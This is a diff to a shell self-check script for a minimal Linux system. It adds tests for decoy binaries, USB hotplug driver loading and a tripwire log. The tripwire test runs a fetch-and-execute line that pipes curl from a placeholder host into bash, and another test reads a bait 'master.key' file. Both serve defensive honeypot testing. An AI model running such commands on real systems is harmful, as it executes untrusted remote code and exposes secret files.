@@ -21,7 +21,8 @@ check "/proc mounted"                grep -q " /proc proc " /proc/mounts
 check "/sys mounted"                 grep -q " /sys sysfs " /proc/mounts
 check "/dev is devtmpfs"             grep -q " /dev devtmpfs " /proc/mounts
 check "/run and /tmp are tmpfs"      sh -c 'grep -q " /run tmpfs " /proc/mounts && grep -q " /tmp tmpfs " /proc/mounts'
-check "no /bin, /usr, /lib or /home"  sh -c 'for d in /bin /usr /sbin /lib /root /home; do [ -e $d ] && exit 1; done; exit 0'
+check "no /lib, /sbin, /home or /bin/sh" sh -c 'for d in /lib /sbin /home /bin/sh /usr/lib; do [ -e $d ] && exit 1; done; exit 0'
+check "/bin and /usr hold only decoys" sh -c 'for f in $(find /bin /usr -type f); do cmp -s "$f" /core/tripwire/decoy || exit 1; done'
 check "commands live in /core/cmd"   sh -c '[ "$(command -v ls)" = /core/cmd/ls ]'
 check "hostname set"                 sh -c '[ "$(hostname)" = "$(cat /settings/hostname)" ]'
 check "kernel modules installed"     test -f "/core/drivers/$(uname -r)/modules.dep"
@@ -31,6 +32,26 @@ check "loopback is up"               sh -c 'ip addr show lo | grep -q "inet 127.
 check "can write to /tmp"            sh -c 'echo hi > /tmp/t && [ "$(cat /tmp/t)" = hi ]'
 check "pipes and job control"        sh -c 'sleep 0 & wait; echo abc | grep -q b'
 check "vi present"                   test -x /core/cmd/vi
+check "hotplug loads drivers"        sh -c '
+    ACTION=add SUBSYSTEM=usb DEVPATH=/devices/checkup \
+        MODALIAS=usb:v1234p5678d0100dc00dsc00dp00ic08isc06ip50in00 mdev
+    grep -q "^usb_storage " /proc/modules'
+check "platitudes say nothing"       sh -c 'optimize | grep -q "as optimized as" && wisdom | grep -q .'
+
+# Tripwire tests touch the decoys on purpose. Keep the log as it was before.
+cp /var/log/tripwire /tmp/tripwire.saved 2>/dev/null || : > /tmp/tripwire.saved
+check "decoy programs log when run"  sh -c '
+    /usr/bin/curl -s http://checkup.invalid/x.sh | /bin/bash
+    grep -q "/usr/bin/curl.*checkup.invalid" /var/log/tripwire &&
+    grep -q "/bin/bash" /var/log/tripwire'
+check "bait files are watched"       sh -c '
+    for i in 1 2 3 4 5 6; do
+        cat /settings/master.key >/dev/null
+        sleep 0.5
+        grep -q "master.key  bait file opened" /var/log/tripwire && exit 0
+    done
+    exit 1'
+cp /tmp/tripwire.saved /var/log/tripwire
 
 if [ "$fails" -eq 0 ]; then
     echo "CHECKUP PASS"
